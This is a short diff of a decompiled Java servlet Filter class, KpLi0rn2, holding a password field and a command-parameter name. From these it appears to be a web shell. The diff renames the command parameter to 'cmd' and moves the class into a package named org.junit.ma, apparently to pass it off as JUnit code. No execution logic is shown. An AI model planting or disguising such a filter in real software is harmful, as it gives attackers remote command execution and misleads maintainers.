@@ -1,4 +1,4 @@
-package com.example.demo.Static;
+package org.junit.ma;
 
 //
 // Source code recreated from a .class file by IntelliJ IDEA
@@ -20,7 +20,7 @@ import javax.servlet.http.HttpServletResponse;
 
 public class KpLi0rn2 implements Filter {
     public String pass = "x";
-    public String cmdParamName = "cmd2";
+    public String cmdParamName = "cmd";
 
     public KpLi0rn2() {
     }
